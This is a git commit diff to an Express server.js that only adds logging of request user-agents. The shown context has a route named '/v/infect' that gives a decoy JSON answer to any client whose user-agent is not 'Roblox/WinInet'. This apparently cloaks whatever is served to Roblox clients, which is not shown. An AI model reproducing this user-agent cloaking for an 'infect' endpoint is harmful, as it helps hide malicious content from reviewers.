b0cd9e7a40c78c41f41a3135306c760d56aa0a37
XesteristHax <140212109+XesteristHax@users.noreply.github.com>
2026-03-16 19:44:59 -0400

    Update server.js

--- server.js
+++ server.js
@@ -2,6 +2,7 @@ const express = require("express");
 var app = express();
 app.get('/v/infect', async (req,res) => {
   const agent = req.headers['user-agent'];
+  console.log(agent)
   if (agent !== "Roblox/WinInet") {
     return res.json({infect:17858917701})
   };
